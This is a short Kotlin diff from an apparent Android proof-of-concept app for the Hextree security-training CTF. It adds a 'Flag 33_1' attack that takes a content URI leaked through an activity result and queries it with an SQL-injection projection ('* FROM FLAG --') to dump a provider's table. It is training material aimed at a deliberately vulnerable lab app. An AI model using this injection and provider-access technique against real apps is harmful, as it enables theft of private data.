@@ -24,6 +24,7 @@ import androidx.compose.ui.Modifier
 import androidx.compose.ui.graphics.Color
 import androidx.compose.ui.platform.LocalContext
 import androidx.compose.ui.unit.dp
+import com.vishal2376.hextreepoc.Utils.dumpCursor
 import com.vishal2376.hextreepoc.ui.theme.HextreePoCTheme
 
 class HextreeActivity : ComponentActivity() {
@@ -61,6 +62,18 @@ class HextreeActivity : ComponentActivity() {
 		if (requestCode == 9) {
 			Utils.showDialog(this, data)
 		}
+
+		// Flag33_1 result — capture and display stolen flag from setResult()
+		if (requestCode == 331) {
+			Utils.showDialog(this, data)
+
+			dumpCursor(
+				context = this,
+				uri = data?.data.toString(),
+				projection = arrayOf("* FROM FLAG --"),
+				title = "Flag 33_1"
+			)
+		}
 	}
 
 	override fun onNewIntent(intent: Intent?) {
@@ -97,7 +110,8 @@ fun MainScreen(activity: HextreeActivity) {
 			Flag("Flag 22 - Pending Intent") { attack.flag22() },
 			Flag("Flag 30 - Content Provider Query") { attack.flag30() },
 			Flag("Flag 31 - Provider URI Matching") { attack.flag31() },
-			Flag("Flag 32 - SQL Injection") { attack.flag32() },
+			Flag("Flag 32 - SQL Injection Query") { attack.flag32() },
+			Flag("Flag 33_1 - Return Provider Access") { attack.flag33A1() },
 		)
 	}
 
